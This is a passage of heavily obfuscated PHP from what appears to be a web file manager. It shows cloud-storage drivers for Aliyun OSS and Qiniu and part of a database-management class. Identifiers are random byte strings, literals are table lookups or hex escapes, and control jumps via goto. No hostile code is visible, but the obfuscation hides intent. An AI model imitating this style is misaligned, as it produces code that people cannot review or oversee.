$ËëÊ‚ÄÃ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[¹ş¤¶ĞÖ][1443] . $ôÃ‡¿â); $„ÇÎÛ’ü = $this->link($Æ¯¤ø©ƒ, $ËëÊ‚ÄÃ); $this->fileOutLink($„ÇÎÛ’ü); } public function fileOutImageServer($¼Ø¦µ—Â, $ú™®Ğç§ = 250) { parent::fileOutImage($¼Ø¦µ—Â, $ú™®Ğç§); } public function fileOutLink($¦âÌ’­÷) { $ú»»õáÔ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$this->isCdnHost() && substr($¦âÌ’­÷, 0, 7) == $ú»»õáÔ[1364]) { $¦âÌ’­÷ = $ú»»õáÔ[1365] . substr($¦âÌ’­÷, 7); } header($ú»»õáÔ[161] . $¦âÌ’­÷); die; } public function hashMd5($ÌÑÒìğ, $ğ½éäÙã = '') { $’¾ßª²è =& $_SERVER[¹ş¤¶ĞÖ]; $Ñ‘€®ú‚ = $this->_objectMeta($ÌÑÒìğ); if (!$Ñ‘€®ú‚) { return $’¾ßª²è[12]; } if (!isset($Ñ‘€®ú‚[$’¾ßª²è[1418]]) && !empty($ğ½éäÙã)) { $îÖĞòøò = $this->updateObjMeta($ÌÑÒìğ, array($’¾ßª²è[1418] => $ğ½éäÙã)); $Ñ‘€®ú‚[$’¾ßª²è[1418]] = $îÖĞòøò ? $ğ½éäÙã : $’¾ßª²è[12]; } return isset($Ñ‘€®ú‚[$’¾ßª²è[1418]]) ? strtolower($Ñ‘€®ú‚[$’¾ßª²è[1418]]) : $’¾ßª²è[12]; } public function size($ü€‰ü) { $í‰—¿¿ = $this->objectMeta($ü€‰ü); return $í‰—¿¿ ? $í‰—¿¿[$_SERVER[¹ş¤¶ĞÖ][76]] : 0; } public function info($š’øÍøÁ) { if ($this->isFolder($š’øÍøÁ)) { return $this->folderInfo($š’øÍøÁ); } else { if ($this->isFile($š’øÍøÁ)) { return $this->fileInfo($š’øÍøÁ); } } return !1; } public function exist($€üıŞé„) { return $this->isFile($€üıŞé„) || $this->isFolder($€üıŞé„); } public function isFile($âÕæØ¡æ) { return !$this->isFolder($âÕæØ¡æ) && $this->objectMeta($âÕæØ¡æ); } public function isFolder($–Öş¾­Ò) { return $this->cacheMethod($_SERVER[¹ş¤¶ĞÖ][165], $–Öş¾­Ò); } protected function objectMeta($Á˜õƒï) { return $this->cacheMethod($_SERVER[¹ş¤¶ĞÖ][167], $Á˜õƒï); } protected function _objectMeta($€Ê´ê³Ë) { $«¸º«úâ =& $_SERVER[¹ş¤¶ĞÖ]; try { $£ÍàÁ„¨ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($€Ê´ê³Ë)); } catch (OSS\Core\OssException $æ»ê²—×) { $£ÍàÁ„¨ = !1; } if ($£ÍàÁ„¨) { $£ÍàÁ„¨[$«¸º«úâ[76]] = intval($£ÍàÁ„¨[$«¸º«úâ[1416]]); } return $£ÍàÁ„¨; } protected function _isFolder($Œò¾¤š”) { $åÁ¯›£° =& $_SERVER[¹ş¤¶ĞÖ]; if ($Œò¾¤š” == $åÁ¯›£°[12] || $Œò¾¤š” == $åÁ¯›£°[8]) { return !0; } $È½êñÕŸ = array($åÁ¯›£°[1412] => $åÁ¯›£°[8], $åÁ¯›£°[1413] => rtrim($Œò¾¤š”, $åÁ¯›£°[8]) . $åÁ¯›£°[8], $åÁ¯›£°[1414] => 1, $åÁ¯›£°[1415] => $åÁ¯›£°[12]); $ë‡ªşÔ“ = $this->client->listObjects($this->bucket, $È½êñÕŸ); if ($ë‡ªşÔ“->getObjectList() || $ë‡ªşÔ“->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($µèâ‡‰) { parent::__construct(); require_once SDK_DIR . $_SERVER[¹ş¤¶ĞÖ][1444]; $this->_init($µèâ‡‰); } public function _init($¿şÆö»ë) { $€š¢µá¯ =& $_SERVER[¹ş¤¶ĞÖ]; $this->config = $¿şÆö»ë; foreach ($¿şÆö»ë as $Ø¡ë×ÒÚ => $Ó¶ïÖ£›) { if (isset($this->{$Ø¡ë×ÒÚ})) { $this->{$Ø¡ë×ÒÚ} = $Ó¶ïÖ£›; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($€š¢µá¯[1445] . LNG($€š¢µá¯[1403])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($ÀÍ¯Ñ†, $Ä¨¡Á“ê = '', $ŞüÊÇÇÃ = REPEAT_RENAME) { if ($this->setContent($ÀÍ¯Ñ†, $Ä¨¡Á“ê)) { return $this->getPathOuter($ÀÍ¯Ñ†); } return !1; } public function mkdir($àÑ™Áë, $ú’ºê»· = REPEAT_SKIP) { $„ĞŠ¿ƒé =& $_SERVER[¹ş¤¶ĞÖ]; $†ÀäßØ = trim($àÑ™Áë, $„ĞŠ¿ƒé[8]); if ($this->_isFolder($†ÀäßØ)) { return $this->getPathOuter($†ÀäßØ); } $àÑ™Áë = $†ÀäßØ . $„ĞŠ¿ƒé[8]; $Ğô÷ú© = get_path_this($†ÀäßØ); $îÜüÙ“É = $àÑ™Áë . $Ğô÷ú©; if (!$this->mkfile($îÜüÙ“É)) { return !1; } if (!$this->moveFile($îÜüÙ“É, $àÑ™Áë)) { $this->delFile($îÜüÙ“É); return !1; } return $this->getPathOuter($†ÀäßØ); } public function copyFile($°şŞ±Èì, $¥ô·‰™€) { $¿şÓİÜ = $this->bucketManager->copy($this->bucket, $°şŞ±Èì, $this->bucket, $¥ô·‰™€, !0); return $¿şÓİÜ ? !1 : $this->getPathOuter($¥ô·‰™€); } public function moveFile($ÛÉêÔ, $ì‘–œö¶) { $˜­¥»àè = $this->bucketManager->move($this->bucket, $ÛÉêÔ, $this->bucket, $ì‘–œö¶, !0); return $˜­¥»àè ? !1 : $this->getPathOuter($ì‘–œö¶); } public function delFile($ÊíÔ»¨†) { if (!$this->exist($ÊíÔ»¨†)) { return !0; } $¡ğé²¾Â = $this->bucketManager->delete($this->bucket, $ÊíÔ»¨†); return $¡ğé²¾Â ? !1 : !0; } public function delFolder($ÆÅ¡ÂÒ) { $Ç¿£µ½ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$this->exist($ÆÅ¡ÂÒ)) { return !0; } $this->listItemCache = !1; $å™’ƒÆó = $this->fileList($ÆÅ¡ÂÒ); $this->listItemCache = !0; $š‹óÂ¶Œ = trim($ÆÅ¡ÂÒ, $Ç¿£µ½[8]) . $Ç¿£µ½[8]; if (!empty($ÆÅ¡ÂÒ) && $ÆÅ¡ÂÒ !== $Ç¿£µ½[198] && !in_array($š‹óÂ¶Œ, $å™’ƒÆó[$Ç¿£µ½[82]])) { $å™’ƒÆó[$Ç¿£µ½[82]][] = $š‹óÂ¶Œ; } $Âå‡àÑ = $this->delByBatch($å™’ƒÆó[$Ç¿£µ½[83]]); if (!$Âå‡àÑ) { return !1; } $Âå‡àÑ = $this->delByBatch($å™’ƒÆó[$Ç¿£µ½[82]]); if (!$Âå‡àÑ) { return !1; } return $this->delFile($š‹óÂ¶Œ); } private function delByBatch($Üµ´Ú–) { foreach (array_chunk($Üµ´Ú–, 1000) as $ó•ñªÜí) { $„¼Ï¨ü = $this->bucketManager->buildBatchDelete($this->bucket, $ó•ñªÜí); list($†ÂÃ®Í, $Õ‚—à) = $this->bucketManager->batch($„¼Ï¨ü); if ($Õ‚—à) { return !1; } } return !0; } public function rename($ËœøËÄ¢, $˜¶È—Š½) { return $this->renameObject($ËœøËÄ¢, $˜¶È—Š½); } public function fileInfo($±ğ’”Ù, $¹¶õœç = false, $À†µ½Ïó = array()) { $ü¥Ê†‰ú =& $_SERVER[¹ş¤¶ĞÖ]; $Ïñ­´òÛ = array($ü¥Ê†‰ú[32] => $this->pathThis($±ğ’”Ù), $ü¥Ê†‰ú[84] => $this->getPathOuter($ü¥Ê†‰ú[8] . $±ğ’”Ù), $ü¥Ê†‰ú[33] => $ü¥Ê†‰ú[200], $ü¥Ê†‰ú[76] => isset($À†µ½Ïó[$ü¥Ê†‰ú[1446]]) ? $À†µ½Ïó[$ü¥Ê†‰ú[1446]] : 0, $ü¥Ê†‰ú[174] => $this->ext($±ğ’”Ù)); if ($¹¶õœç) { return $Ïñ­´òÛ; } $Ïñ­´òÛ[$ü¥Ê†‰ú[201]] = $Ïñ­´òÛ[$ü¥Ê†‰ú[85]] = 0; $Ïñ­´òÛ[$ü¥Ê†‰ú[202]] = $Ïñ­´òÛ[$ü¥Ê†‰ú[203]] = !0; if (empty($À†µ½Ïó)) { $À†µ½Ïó = $this->objectMeta($±ğ’”Ù); if (!$À†µ½Ïó) { return $Ïñ­´òÛ; } } if (isset($À†µ½Ïó[$ü¥Ê†‰ú[1447]])) { $Ïñ­´òÛ[$ü¥Ê†‰ú[85]] = substr($À†µ½Ïó[$ü¥Ê†‰ú[1447]] . $ü¥Ê†‰ú[12], 0, 10); } if (isset($À†µ½Ïó[$ü¥Ê†‰ú[1446]])) { $Ïñ­´òÛ[$ü¥Ê†‰ú[76]] = $À†µ½Ïó[$ü¥Ê†‰ú[1446]]; } return $Ïñ­´òÛ; } public function folderInfo($Ê’£ÄÍÍ, $³¿±Ü½¸ = false) { $ğşâ¿Å„ =& $_SERVER[¹ş¤¶ĞÖ]; $ù¯Šï«ü = array($ğşâ¿Å„[32] => $this->pathThis($Ê’£ÄÍÍ), $ğşâ¿Å„[84] => $this->getPathOuter($ğşâ¿Å„[8] . $Ê’£ÄÍÍ), $ğşâ¿Å„[33] => $ğşâ¿Å„[75]); if ($³¿±Ü½¸) { return $ù¯Šï«ü; } $ù¯Šï«ü[$ğşâ¿Å„[201]] = $ù¯Šï«ü[$ğşâ¿Å„[85]] = 0; $ù¯Šï«ü[$ğşâ¿Å„[202]] = $ù¯Šï«ü[$ğşâ¿Å„[203]] = !0; $Ê’£ÄÍÍ = rtrim($Ê’£ÄÍÍ, $ğşâ¿Å„[8]) . $ğşâ¿Å„[8]; $€ğãÏ¶µ = $this->objectMeta($Ê’£ÄÍÍ); if (isset($€ğãÏ¶µ[$ğşâ¿Å„[1447]])) { $ù¯Šï«ü[$ğşâ¿Å„[85]] = substr($€ğãÏ¶µ[$ğşâ¿Å„[1447]] . $ğşâ¿Å„[12], 0, 10); } return $ù¯Šï«ü; } public function listPath($äÏ³à’Ê, $ĞÖÃÚë© = false) { $Ó‚ş’ô =& $_SERVER[¹ş¤¶ĞÖ]; $ØÁÑšĞ = $this->fileList($äÏ³à’Ê, $Ó‚ş’ô[8], !0); foreach ($ØÁÑšĞ[$Ó‚ş’ô[82]] as $¾ÉÄ»î° => $¸ôµèê) { $ØÁÑšĞ[$Ó‚ş’ô[82]][$¾ÉÄ»î°] = $this->folderInfo($¸ôµèê, $ĞÖÃÚë©); } foreach ($ØÁÑšĞ[$Ó‚ş’ô[83]] as $¾ÉÄ»î° => $¸ôµèê) { $ØÁÑšĞ[$Ó‚ş’ô[83]][$¾ÉÄ»î°] = $this->fileInfo($¸ôµèê[$Ó‚ş’ô[94]], $ĞÖÃÚë©, $¸ôµèê); } return $ØÁÑšĞ; } public function has($ãº€³ñ³, $ÌàÁÒš¬ = false, $¹¿Ÿ»É¾ = true) { $ŸóŸ¾©• =& $_SERVER[¹ş¤¶ĞÖ]; $ãº€³ñ³ = trim($ãº€³ñ³, $ŸóŸ¾©•[8]); $†œ±ò‘ = empty($ãº€³ñ³) && $ãº€³ñ³ !== $ŸóŸ¾©•[198] ? $ŸóŸ¾©•[12] : $ãº€³ñ³ . $ŸóŸ¾©•[8]; $‚Ñˆ°€‘ = $ŸóŸ¾©•[12]; $«Ã´¢³ = 500; $¾Ã‚íÖ‰ = $ŸóŸ¾©•[8]; $©‘ÈÄÚ“ = $ñßÄ«¬œ = 0; while (!0) { check_abort(); list($¬¬Íàé÷, $óàæû¸†) = $this->bucketManager->listFiles($this->bucket, $†œ±ò‘, $‚Ñˆ°€‘, $«Ã´¢³, $¾Ã‚íÖ‰); if ($óàæû¸†) { break; } $‚Ñˆ°€‘ = array_key_exists($ŸóŸ¾©•[1415], $¬¬Íàé÷) ? $‚Ñˆ°€‘ = $¬¬Íàé÷[$ŸóŸ¾©•[1448]] : $ŸóŸ¾©•[12]; if ($ÌàÁÒš¬) { if (!empty($¬¬Íàé÷[$ŸóŸ¾©•[1449]])) { $©‘ÈÄÚ“ += count($¬¬Íàé÷[$ŸóŸ¾©•[1449]]); } if (!empty($¬¬Íàé÷[$ŸóŸ¾©•[1450]])) { $ñßÄ«¬œ += count($¬¬Íàé÷[$ŸóŸ¾©•[1450]]); } if ($‚Ñˆ°€‘ === $ŸóŸ¾©•[12]) { break; } continue; } if ($¹¿Ÿ»É¾) { if (!empty($¬¬Íàé÷[$ŸóŸ¾©•[1449]])) { return !0; } } else { if (!empty($¬¬Íàé÷[$ŸóŸ¾©•[1450]])) { return !0; } } if ($‚Ñˆ°€‘ === $ŸóŸ¾©•[12]) { break; } } if ($ÌàÁÒš¬) { return array($ŸóŸ¾©•[207] => $©‘ÈÄÚ“, $ŸóŸ¾©•[208] => $ñßÄ«¬œ); } return !1; } public function listAll($ÂŸ•¸ö…) { $ñ³ßå‡ =& $_SERVER[¹ş¤¶ĞÖ]; $ÁŞ€º» = $this->fileList($ÂŸ•¸ö…, $ñ³ßå‡[12], !0); $Ìæƒıñ† = array_to_keyvalue($ÁŞ€º»[$ñ³ßå‡[83]], $ñ³ßå‡[32]); foreach ($ÁŞ€º»[$ñ³ßå‡[82]] as $¯¥üìå) { if (is_string($¯¥üìå)) { $Ìæƒıñ†[$¯¥üìå] = array($ñ³ßå‡[76] => 0); } } return $this->listAllFiles($ÂŸ•¸ö…, $Ìæƒıñ†); } private function fileList($üŠ¿×Á‡, $Ì‘˜ıÅğ = '', $‡¶İóğ = 0) { $óÛš‚âœ =& $_SERVER[¹ş¤¶ĞÖ]; $üŠ¿×Á‡ = trim($üŠ¿×Á‡, $óÛš‚âœ[8]); $Ğø‘Ó…í = empty($üŠ¿×Á‡) && $üŠ¿×Á‡ !== $óÛš‚âœ[198] ? $óÛš‚âœ[12] : $üŠ¿×Á‡ . $óÛš‚âœ[8]; $» ‡¼ÊÊ = $óÛš‚âœ[12]; $»ÀæÖö„ = 1000; $–ıì¿Î = $÷ü–ßœÙ = array(); while (!0) { check_abort(); list($ÉÇóş¶±, $²öØá÷‡) = $this->bucketManager->listFiles($this->bucket, $Ğø‘Ó…í, $» ‡¼ÊÊ, $»ÀæÖö„, $Ì‘˜ıÅğ); if ($²öØá÷‡) { break; } $» ‡¼ÊÊ = array_key_exists($óÛš‚âœ[1415], $ÉÇóş¶±) ? $» ‡¼ÊÊ = $ÉÇóş¶±[$óÛš‚âœ[1448]] : $óÛš‚âœ[12]; $¿é‘À•‹ = isset($ÉÇóş¶±[$óÛš‚âœ[1449]]) ? $ÉÇóş¶±[$óÛš‚âœ[1449]] : array(); $ÒŞç“…¨ = isset($ÉÇóş¶±[$óÛš‚âœ[1450]]) ? $ÉÇóş¶±[$óÛš‚âœ[1450]] : array(); foreach ($¿é‘À•‹ as $ı²â”ÀŒ) { if ($ı²â”ÀŒ[$óÛš‚âœ[94]] == $Ğø‘Ó…í) { continue; } $„“® çÒ = $ı²â”ÀŒ[$óÛš‚âœ[94]]; $ºîĞì“ì = $ı²â”ÀŒ[$óÛš‚âœ[1446]]; $ı²â”ÀŒ[$óÛš‚âœ[76]] = $ºîĞì“ì; $é¨ìë¬‹ = $ºîĞì“ì == 0 && substr($„“® çÒ, strlen($„“® çÒ) - 1, 1) == $óÛš‚âœ[8] ? !0 : !1; $this->cacheMethodInfoSet($„“® çÒ, $é¨ìë¬‹, $ı²â”ÀŒ); if ($é¨ìë¬‹) { $–ıì¿Î[] = $„“® çÒ; continue; } $÷ü–ßœÙ[] = $‡¶İóğ ? $ı²â”ÀŒ : $„“® çÒ; } foreach ($ÒŞç“…¨ as $„“® çÒ) { if ($„“® çÒ == $Ğø‘Ó…í) { continue; } $–ıì¿Î[] = $„“® çÒ; $this->cacheMethodInfoSet($„“® çÒ, !0); } if ($» ‡¼ÊÊ === $óÛš‚âœ[12]) { break; } } $this->cacheMethodInfoSet($üŠ¿×Á‡, !0); return array($óÛš‚âœ[82] => $–ıì¿Î, $óÛš‚âœ[83] => $÷ü–ßœÙ); } public function canRead($Œ­±Ä·ë) { return $this->exist($Œ­±Ä·ë) ? !0 : !1; } public function canWrite($”‡½¨ß³) { return $this->exist($”‡½¨ß³) ? !0 : !1; } public function getContent($ƒçà³­ğ) { return $this->fileSubstr($ƒçà³­ğ, 0, -1); } public function setContent($İÅ“«Ğü, $º «Ÿ = '') { $¶²Á³°¸ = $this->tempFile($this->pathThis($İÅ“«Ğü)); file_put_contents($¶²Á³°¸, $º «Ÿ); if ($this->upload($İÅ“«Ğü, $¶²Á³°¸)) { $this->tempFileRemve($¶²Á³°¸); return !0; } return !1; } public function refreshUrls($×û’ÜŞÛ) { $‘ñË€ïÃ =& $_SERVER[¹ş¤¶ĞÖ]; $˜Ö¤½àˆ = array(); if (is_array($×û’ÜŞÛ)) { foreach ($×û’ÜŞÛ as $©ƒÏıàÈ) { $˜Ö¤½àˆ[] = $this->link($©ƒÏıàÈ); } } else { $˜Ö¤½àˆ[] = $this->link($×û’ÜŞÛ); } $ÏÌŒ¦ô¸ = new Qiniu\Cdn\CdnManager($this->auth); list($Ó×Â†ş³, $ÒüŠ¯Á‘) = $ÏÌŒ¦ô¸->refreshUrls($˜Ö¤½àˆ); if ($ÒüŠ¯Á‘) { return !1; } return $Ó×Â†ş³[$‘ñË€ïÃ[1215]] == $‘ñË€ïÃ[785] ? !0 : !1; } public function fileSubstr($à÷ŒäŞŸ, $²šàÈƒÒ, $ß—‘Ì²Á) { $œÊÉŞÃÆ =& $_SERVER[¹ş¤¶ĞÖ]; if (!($ğ´ÁÍ‘Ø = $this->link($à÷ŒäŞŸ))) { return !1; } $œè¼ôó¨ = !1; if ($ß—‘Ì²Á > 0) { $Äñ•öÃÙ = $²šàÈƒÒ + $ß—‘Ì²Á - 1; $œè¼ôó¨ = array($œÊÉŞÃÆ[1451] . $²šàÈƒÒ . $œÊÉŞÃÆ[415] . $Äñ•öÃÙ); } $…ä°Öµ = url_request($ğ´ÁÍ‘Ø, $œÊÉŞÃÆ[230], !1, $œè¼ôó¨); return $…ä°Öµ[$œÊÉŞÃÆ[776]] ? $…ä°Öµ[$œÊÉŞÃÆ[1235]] : !1; } public function upload($ü˜‡ŠÎñ, $ÈÉåÇŞŞ, $âÄ‘ª¹Ï = false, $áôâíéæ = REPEAT_REPLACE) { $í½Ôîª = new Qiniu\Storage\UploadManager(); $şˆãêòè = $this->auth->uploadToken($this->bucket, $ü˜‡ŠÎñ); $¡ô¸¹Â× = get_file_mime(get_path_ext($ÈÉåÇŞŞ)); list($×´ûªæ«, $œøğ‹¨ó) = $í½Ôîª->putFile($şˆãêòè, $ü˜‡ŠÎñ, $ÈÉåÇŞŞ, null, $¡ô¸¹Â×); return $œøğ‹¨ó ? !1 : $this->getPathOuter($ü˜‡ŠÎñ); } public function uploadFormData($úÙáò±É, $¶ÜñÁñ¯ = 3600) { return $this->uploadToken($úÙáò±É, $¶ÜñÁñ¯); } public function multiUploadFormData($†ÙøêµŒ, $Š›É¤î° = 3600) { return $this->uploadToken($†ÙøêµŒ, $Š›É¤î°); } private function uploadToken($ç¯¹¥”, $óƒ»¼›Á = 3600) { $°˜íÊª =& $_SERVER[¹ş¤¶ĞÖ]; $şñœÚ¢ = $óƒ»¼›Á; $ô¥­Î­ = array($°˜íÊª[1452] => $°˜íÊª[1453]); $‰ËÄøş = $ç¯¹¥”; $‹ğÂÔ™¸ = $this->auth->uploadToken($this->bucket, $‰ËÄøş, $şñœÚ¢, $ô¥­Î­, !0); $•€šàŞÈ = empty($this->region) || $this->region == $°˜íÊª[1454] ? $°˜íÊª[12] : $°˜íÊª[415] . $this->region; $÷×ŞâĞô = http_type() . "\72\x2f\57\165\x70\154\157\x61\x64{$•€šàŞÈ}\56\161\151\x6e\x69\165\x70\x2e\x63\157\155\x2f"; return array($°˜íÊª[1455] => $‹ğÂÔ™¸, $°˜íÊª[1456] => $÷×ŞâĞô); } public function download($ÅòºÏ×Ä, $ÄÆ‡·†ú) { $‰Ğ³×õ¿ = IO::getPathInner(IO::mkfile($ÄÆ‡·†ú)); if (!($˜Êï áŸ = $this->link($ÅòºÏ×Ä))) { return !1; } $§ìÁ’ƒ³ = 0; $Ê®Ú¹—— = 1024 * 200; $¶¡Ã…­ú = fopen($‰Ğ³×õ¿, $_SERVER[¹ş¤¶ĞÖ][1457]); while (!0) { $Üê¬ ÕĞ = $this->fileSubstr($ÅòºÏ×Ä, $§ìÁ’ƒ³, $Ê®Ú¹——); if ($Üê¬ ÕĞ === !1) { return !1; } fwrite($¶¡Ã…­ú, $Üê¬ ÕĞ); $§ìÁ’ƒ³ += $Ê®Ú¹——; if (strlen($Üê¬ ÕĞ) < $Ê®Ú¹——) { break; } } fclose($¶¡Ã…­ú); return $ÄÆ‡·†ú; } public function link($ ™ë¦ , $ùí­³ä¶ = '') { if (!$this->isFile($ ™ë¦ )) { return !1; } $Öæ‹àÂ× = $this->getHost() . $_SERVER[¹ş¤¶ĞÖ][8] . $this->pathEncode($ ™ë¦ ) . $ùí­³ä¶; return $this->auth->privateDownloadUrl($Öæ‹àÂ×, 3600 * 12); } public function fileOut($¥ˆù½ğÛ, $ì¼íú£‹ = false, $ÙÛù¨˜ = false, $–¤šÍ½Î = '') { $Ç¹Òºù° =& $_SERVER[¹ş¤¶ĞÖ]; if ($this->isFileOutServer()) { return $this->fileOutServer($¥ˆù½ğÛ, $ì¼íú£‹, $ÙÛù¨˜, $–¤šÍ½Î); } if (!$ÙÛù¨˜) { $ÙÛù¨˜ = $this->pathThis($¥ˆù½ğÛ); } $âÒÎ†©æ = $ì¼íú£‹ ? $Ç¹Òºù°[1458] . rawurlencode($ÙÛù¨˜) : $Ç¹Òºù°[12]; $ˆÖöÀ´ò = $this->link($¥ˆù½ğÛ, $âÒÎ†©æ); $this->fileOutLink($ˆÖöÀ´ò); } public function fileOutServer($¥ĞÕ«°, $ú²Öü°© = false, $¸’äá­Ÿ = false, $Ç¬å©¸ª = '') { parent::fileOut($¥ĞÕ«°, $ú²Öü°©, $¸’äá­Ÿ, $Ç¬å©¸ª); } public function fileOutImage($¹ş·ÅÀ, $Éà®ã¼ = 250) { $áÕõ©îª = $this->link($¹ş·ÅÀ, $_SERVER[¹ş¤¶ĞÖ][1459] . $Éà®ã¼); $this->fileOutLink($áÕõ©îª); } public function fileOutImageServer($İÄª¢âú, $×Ø®øÓƒ = 250) { parent::fileOutImage($İÄª¢âú, $×Ø®øÓƒ); } public function hashMd5($ÍŠÛÔ¬š) { $À´«£˜µ =& $_SERVER[¹ş¤¶ĞÖ]; $´áÛ²¢÷ = $this->objectMeta($ÍŠÛÔ¬š); return isset($´áÛ²¢÷[$À´«£˜µ[212]]) ? $´áÛ²¢÷[$À´«£˜µ[212]] : !1; $Û£êµÆÜ = $this->link($ÍŠÛÔ¬š, $À´«£˜µ[1460]); } public function size($­ˆï¤ó) { $Ùä§“é¥ = $this->objectMeta($­ˆï¤ó); return $Ùä§“é¥ ? $Ùä§“é¥[$_SERVER[¹ş¤¶ĞÖ][76]] : 0; } public function info($éîîÔÏƒ) { if ($this->isFolder($éîîÔÏƒ)) { return $this->folderInfo($éîîÔÏƒ); } else { if ($this->isFile($éîîÔÏƒ)) { return $this->fileInfo($éîîÔÏƒ); } } return !1; } public function exist($ãèµÇ€ ) { return $this->isFile($ãèµÇ€ ) || $this->isFolder($ãèµÇ€ ); } public function isFile($½¶¶ÎŞ©) { return !$this->isFolder($½¶¶ÎŞ©) && $this->objectMeta($½¶¶ÎŞ©); } public function isFolder($Ì£×Ğò) { return $this->cacheMethod($_SERVER[¹ş¤¶ĞÖ][165], $Ì£×Ğò); } protected function objectMeta($å¤¸¢ªø) { return $this->cacheMethod($_SERVER[¹ş¤¶ĞÖ][167], $å¤¸¢ªø); } protected function _objectMeta($‘ßİÁ‚Ö) { $¢§µô°‚ =& $_SERVER[¹ş¤¶ĞÖ]; list($¥Ñ¿íâ, $€ï¹ÎõŠ) = $this->bucketManager->stat($this->bucket, $‘ßİÁ‚Ö); if ($¥Ñ¿íâ) { $¥Ñ¿íâ[$¢§µô°‚[76]] = intval($¥Ñ¿íâ[$¢§µô°‚[1446]]); } return $¥Ñ¿íâ; } protected function _isFolder($¦ş€¨…) { $™Ö£òğ =& $_SERVER[¹ş¤¶ĞÖ]; if ($¦ş€¨… == $™Ö£òğ[12] || $¦ş€¨… == $™Ö£òğ[8]) { return !0; } list($–‰¦½ş–, $ÇéŸÌñŞ) = $this->bucketManager->listFiles($this->bucket, trim($¦ş€¨…, $™Ö£òğ[8]) . $™Ö£òğ[8], $™Ö£òğ[12], 1, $™Ö£òğ[8]); return !empty($–‰¦½ş–[$™Ö£òğ[1449]]) || !empty($–‰¦½ş–[$™Ö£òğ[1450]]) ? !0 : !1; } } goto dè“®•µš; e„ÂˆÌå¸ª: class DbManage { function __construct($×¸•™¶ = array()) { $·‹†üç½ =& $_SERVER[¹ş¤¶ĞÖ]; if (empty($×¸•™¶)) { $×¸•™¶ = $GLOBALS[$·‹†üç½[6]][$·‹†üç½[21]]; } $this->database = $×¸•™¶; } public function model($°¡ã—¼ä = '') { return new ModelBase($°¡ã—¼ä, $_SERVER[¹ş¤¶ĞÖ][12], $this->database); } public function db($¾ÃËüä† = false) { $‡â¤§È– =& $_SERVER[¹ş¤¶ĞÖ]; $˜”ˆóœ­ = array_change_key_case($this->database); if ($this->dbType() == $‡â¤§È–[13] || !$¾ÃËüä†) { return $this->model()->db(); } $¡ÁÑ˜ = $˜”ˆóœ­[$‡â¤§È–[1005]]; $˜”ˆóœ­[$‡â¤§È–[1005]] = $‡â¤§È–[12]; if ($˜”ˆóœ­[$‡â¤§È–[1000]] == $‡â¤§È–[997]) { $–„³õ = $˜”ˆóœ­[$‡â¤§È–[1006]]; $˜”ˆóœ­[$‡â¤§È–[1006]] = substr($–„³õ, 0, strrpos($–„³õ, $‡â¤§È–[1092])); } $this->database = $˜”ˆóœ­; $ŠƒÒ„’ò = $this->model()->db(); try { $ë«üÓË¢ = $ŠƒÒ„’ò->execute("\163\150\x6f\167\x20\x64\x61\164\x61\142\x61\163\x65\x73\40\x6c\x69\x6b\x65\40\x27{$¡ÁÑ˜}\x27"); } catch (Exception $·Ã½©°) { } if (!$ë«üÓË¢) { $ŠƒÒ„’ò->execute("\x63\x72\x65\141\x74\x65\40\144\141\164\141\142\x61\x73\145\40\x60{$¡ÁÑ˜}\x60"); } $˜”ˆóœ­[$‡â¤§È–[1005]] = $¡ÁÑ˜; if ($˜”ˆóœ­[$‡â¤§È–[1000]] == $‡â¤§È–[997]) { $˜”ˆóœ­[$‡â¤§È–[1006]] .= $‡â¤§È–[1092] . $¡ÁÑ˜; } $this->database = $˜”ˆóœ­; $ŠƒÒ„’ò->execute("\x75\x73\145\40\x60{$¡ÁÑ˜}\140"); return $ŠƒÒ„’ò; } public function createTable($›•Ò„ê×, &$É¤¢Šõ) { $£‹’åØ» =& $_SERVER[¹ş¤¶ĞÖ]; if (!IO::exist($›•Ò„ê×)) { ActionCall($£‹’åØ»[1093], !0, 0); show_json(LNG($£‹’åØ»[1094]), !1); } $ ¿ß‚…› = $this->model()->db(); $‰ê®€Ò = sqlSplit(IO::getContent($›•Ò„ê×)); foreach ($‰ê®€Ò as $¡ıŒß¥ã) { $º³ı¦È = stripos($¡ıŒß¥ã, $£‹’åØ»[1095]) === 0; if ($º³ı¦È) { $É¤¢Šõ->task[$£‹’åØ»[812]] += 1; } $ ¿ß‚…›->execute($¡ıŒß¥ã); if ($º³ı¦È) { preg_match($£‹’åØ»[1096], $¡ıŒß¥ã, $˜Ÿñê˜¿); $É¤¢Šõ->task[$£‹’åØ»[1097]] = $˜Ÿñê˜¿[1]; $É¤¢Šõ->update(1); } } } public function insertTable($ŒıÆÂÃ°, &$˜ŒœÔ¿“) { $’Œ¨ˆÆœ =& $_SERVER[¹ş¤¶ĞÖ]; $ñá„Ÿê = $this->model()->db(); $ñŒöë½ = $Ã²ÄÄŠ‘ ? array($Ã²ÄÄŠ‘) : $ñá„Ÿê->getTables(); foreach ($ŒıÆÂÃ° as $şÛş–˜) { $Ã²ÄÄŠ‘ = basename($şÛş–˜, $’Œ¨ˆÆœ[814]); if (!in_array($Ã²ÄÄŠ‘, $ñŒöë½)) { continue; } $˜ŒœÔ¿“->task[$’Œ¨ˆÆœ[1097]] = $Ã²ÄÄŠ‘; if (get_filesize($şÛş–˜) == 0) { continue; } $‡‹ã¤’¶ = $this->sqlToDb($şÛş–˜, $˜ŒœÔ¿“); if (!$‡‹ã¤’¶) { ActionCall($’Œ¨ˆÆœ[1093], !0, 0); show_json(LNG($’Œ¨ˆÆœ[1098]) . "\133{$Ã²ÄÄŠ‘}\x5d", !1); } } } public function sqlFromDb($öô—•ß, $˜Ø²ªîé, &$÷®ŒÎ, $î£©Ü£´ = '') { if ($÷®ŒÎ) { $÷®ŒÎ->task[$_SERVER[¹ş¤¶ĞÖ][1097]] = $öô—•ß; } 